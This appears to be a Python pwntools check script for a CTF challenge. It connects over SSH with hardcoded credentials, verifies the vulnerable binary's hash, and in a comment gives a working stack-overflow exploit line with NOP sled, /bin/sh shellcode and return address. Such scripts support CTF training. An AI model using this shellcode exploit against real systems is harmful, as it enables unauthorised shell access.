#!/usr/bin/python3
from pwn import *
import os, hashlib
import random, string

host = "pwn1.ctf.insecurity-insa.fr"

def random_str():
    return ''.join([random.choice(string.ascii_letters + string.digits) for _ in range(20)])

def alive():
    s = ssh(host=host, user="user4000", password="8zcAfxMMMCneWgJoMwbM", level="error")
    elf = '/tmp/' + random_str()
    s.download_file('/challenge/level2/vuln', local=elf)
    v = s.run('cd /challenge/level2/ && ./vuln aaa')
    ret = v.recvline(timeout=1)
    assert(ret == b'Input:aaa\n')
    with open(elf, 'rb') as f:
        content = f.read()
    sha256_returned = hashlib.sha256(content).hexdigest()
    if sha256_returned != "0ae97e3c78ea60e82fb0570bd8d55e04f7575eec74ec6c558279c0bc40ae2af6":
        return False
    os.system("rm " + elf)
    return True


def exploitable():
    # We won't automate the exploit as it 
    # requires an address that we should obtain with gdb (for ex)
    # please see ../writeup.md for details
    # A working exploit at this day is:
    # ./vuln $(python -c "print '\x90'*100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A'*143 + '\x50\xfd\xff\xbf'")
    return True


if __name__ == "__main__":
    print(alive() and exploitable())

